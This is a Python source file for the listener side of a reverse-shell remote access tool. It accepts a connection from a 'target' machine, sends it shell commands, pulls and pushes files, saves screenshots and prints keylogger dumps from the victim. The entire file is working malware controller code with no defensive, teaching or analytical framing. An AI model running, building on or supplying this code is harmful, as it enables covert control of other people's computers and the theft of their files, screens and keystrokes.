#!/usr/bin/python3

import socket
import json
import base64
import os
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

count = 1

def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())

def reliable_recv():
    data = ""
    while True:
        try:
            data += target.recv(1024).decode()
            return json.loads(data)
        except ValueError:
            continue

def shell():
    global count
    while True:
        try:
            command = input("* Shell#~%s: " % str(ip))
            reliable_send(command)

            if command == "q":
                break
            elif command[:2] == "cd" and len(command) > 1:
                continue
            elif command[:8] == "download":
                with open(command[9:], "wb") as file:
                    file_data = reliable_recv()
                    file.write(base64.b64decode(file_data))
            elif command[:6] == "upload":
                try:
                    with open(command[7:], "rb") as fin:
                        reliable_send(base64.b64encode(fin.read()).decode())
                except:
                    failed = "Failed To Upload"
                    reliable_send(base64.b64encode(failed.encode()).decode())
            elif command[:10] == "screenshot":
                screenshot_prefix = os.getenv("SCREENSHOT_PREFIX", "screenshot")
                with open(f"{screenshot_prefix}{count}.png", "wb") as screen:
                    image = reliable_recv()
                    image_decoded = base64.b64decode(image)
                    if image_decoded[:4] == b"[!]":
                        print(image_decoded.decode())
                    else:
                        screen.write(image_decoded)
                        count += 1
            elif command[:12] == "keylog_start":
                print("[+] Keylogger started on target.")
                continue
            elif command[:11] == "keylog_dump":
                result = reliable_recv()
                print("=== KEYLOGGER DUMP ===")
                print(result)
                print("=== END DUMP ===")
                continue
            else:
                result = reliable_recv()
                print(result)
        except Exception as e:
            print(f"[!] Error: {e}")
            break

# Socket Setup
SERVER_HOST = os.getenv("SERVER_HOST", "127.0.0.1")
SERVER_PORT = int(os.getenv("SERVER_PORT", "54321"))
MAX_CONNECTIONS = int(os.getenv("MAX_CONNECTIONS", "5"))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((SERVER_HOST, SERVER_PORT))
sock.listen(MAX_CONNECTIONS)
print(f"[+] Listening For Incoming Connections on {SERVER_HOST}:{SERVER_PORT}...")

target, ip = sock.accept()
print("[+] Target Connected From: " + str(ip))

shell()
